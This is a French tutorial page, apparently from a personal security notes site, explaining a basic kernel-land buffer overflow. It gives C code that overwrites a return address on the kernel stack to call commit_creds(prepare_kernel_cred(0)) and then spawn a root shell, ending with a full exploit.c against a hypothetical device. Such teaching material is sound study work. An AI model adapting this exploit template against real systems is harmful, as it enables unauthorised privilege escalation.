---
title: Buffer Overflow Basic
date: 2024-02-21
draft: false
description: Technique pour exploiter un buffer overflow basique côté kernel.
categories:
  - attacks
  - kernel
tags:
  - pwn
  - kernel
---
## Overview
Tout comme pour une exploitation de **BoF** en user-land, notre objectif va être d'overwrite la return address de la fonction vulnérable pour prendre le contrôle du flow d'exécution. 
On se place ici dans le cas où aucune protection n'est présente au niveau du kernel. 
## Detail
Notre objectif lors de l'exploitation d'un buffer overflow en kernel-land est de réussir a exécuter du code user-land tout en profitant de l'exécution de code kernel-land pour [élever nos privilèges](/pwn/kernel/kernel-privesc).

Ainsi, un schéma d'attaque classique nous donnerait :
1) Exploiter le buffer overflow.
2) Overwrite l'adresse de retour de la fonction vulnérable par l'adresse de la fonction *privesc()*.
	- *privesc()* passe les privilèges du process, lancé par notre binaire *exploit*, a root.
3) Maintenant qu'on a des privilèges root, on peut lancer un *system("/bin/sh")*.
![task_struct](/images/kernel_bof.png)
## Exploit
Pour implémenter cette attaque, on va se mettre dans le cas où on peut interagir avec une device, dont la propriété **write** fait appel à une fonction vulnérable à un buffer overflow. Ainsi, lorsque l'on va *write()* plus de caractères qu'attendu, on va overflow sur la stack kernel.

Pour exploiter cela, on va tout d'abord devoir ouvrir la device pour interagir avec elle.
```c title:open_dev()
int global_fd;

void open_dev(){
  global_fd = open("/dev/vulnDevice", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
      puts("[*] Opened device");
  }
}
```

Ensuite on va préparer notre fonction *privesc()* que l'on va appeler une fois avoir pris le contrôle sur le flow d'exécution côté kernel.

| Pour mieux comprendre le principe de l'élévation de privilèges côté kernel, allez voir : [Kernel Privesc](/pwn/kernel/kernel-privesc). |
| --- |

```c title:privesc()
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

void privesc(){
  commit_creds = 0xc107...;
  prepare_kernel_cred = 0xc107...;
  commit_creds(prepare_kernel_cred(0));
}
```

Maintenant qu'on a la fonction qui va nous permettre d'élever nos privilèges, on va pouvoir overflow sur la stack kernel et rediriger le flow d'exécution vers cette fonction.
```c title:overflow()
void overflow(){
  // Overlow at 64 bytes
  unsigned long long payload[17] = {0};
  payload[16] = (unsigned long)privesc;

  write(global_fd, payload, sizeof(payload));
}
```

Grâce à cet exploit, nous avons manipulé le kernel pour qu'il passe le process spawn par *exploit* en tant que process root. Il ne nous reste plus qu'à run un *system("/bin/sh")* pour obtenir un shell root.

En résumé, notre exploit final donne quelque chose comme :
```c title:exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int global_fd;

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

void open_dev(){
  global_fd = open("/dev/vulnDevice", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
      puts("[*] Opened device");
  }
}

void privesc(){
  commit_creds = 0xc107...;
  prepare_kernel_cred = 0xc107...;
  commit_creds(prepare_kernel_cred(0));
}

void overflow(){
  unsigned long long payload[17] = {0};
  payload[16] = (unsigned long)privesc;
  write(global_fd, payload, sizeof(payload));
}

int main() {
  open_dev();
  overflow();
  system("/bin/sh");
  return 0;
}
```
